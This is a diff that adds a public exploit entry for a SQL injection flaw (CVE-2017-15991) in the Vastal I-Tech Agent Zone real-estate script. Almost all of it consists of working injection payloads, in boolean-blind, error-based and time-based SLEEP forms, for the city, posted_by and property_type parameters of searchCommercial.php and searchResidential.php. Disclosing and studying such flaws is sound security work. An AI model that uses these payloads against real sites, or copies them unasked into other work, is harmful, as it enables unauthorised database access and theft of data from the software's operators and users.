@@ -1,0 +1,66 @@
+# # # # # 
+# Exploit Title: Vastal I-Tech Agent Zone - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://vastal.com/
+# Software http://vastal.com/agent-zone-real-estate-script.html
+# Demo: http://agentzone.vastal.com/demo/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15991
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/searchCommercial.php?property_type=[SQL]&city=[SQL]&posted_by=[SQL]
+# 
+# http://localhost/[PATH]/searchResidential.php?property_type=[SQL]&city=[SQL]&bedroom=[SQL]
+# 
+# Parameter: city (GET)
+#     Type: boolean-based blind
+#     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+#     Payload: property_type=&city=-5275 OR 1703=1703#&posted_by=
+# 
+#     Type: error-based
+#     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+#     Payload: property_type=&city=-1769 OR 1 GROUP BY CONCAT(0x7171787671,(SELECT (CASE WHEN (2860=2860) THEN 1 ELSE 0 END)),0x71766a7071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&posted_by=
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+#     Payload: property_type=&city=(CASE WHEN (9487=9487) THEN SLEEP(5) ELSE 9487 END)&posted_by=
+# 
+# Parameter: posted_by (GET)
+#     Type: boolean-based blind
+#     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+#     Payload: property_type=&city=&posted_by=-5550 OR 1335=1335#
+# 
+#     Type: error-based
+#     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+#     Payload: property_type=&city=&posted_by=-9423 OR 1 GROUP BY CONCAT(0x7171787671,(SELECT (CASE WHEN (4134=4134) THEN 1 ELSE 0 END)),0x71766a7071,FLOOR(RAND(0)*2)) HAVING MIN(0)#
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+#     Payload: property_type=&city=&posted_by=(CASE WHEN (3754=3754) THEN SLEEP(5) ELSE 3754 END)
+# 
+# Parameter: property_type (GET)
+#     Type: boolean-based blind
+#     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+#     Payload: property_type=-8633 OR 6527=6527#&city=&posted_by=
+# 
+#     Type: error-based
+#     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+#     Payload: property_type=-4342 OR 1 GROUP BY CONCAT(0x7171787671,(SELECT (CASE WHEN (3911=3911) THEN 1 ELSE 0 END)),0x71766a7071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&city=&posted_by=
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+#     Payload: property_type=(CASE WHEN (2911=2911) THEN SLEEP(5) ELSE 2911 END)&city=&posted_by=
+# 	
+# Etc..
+# # # # #
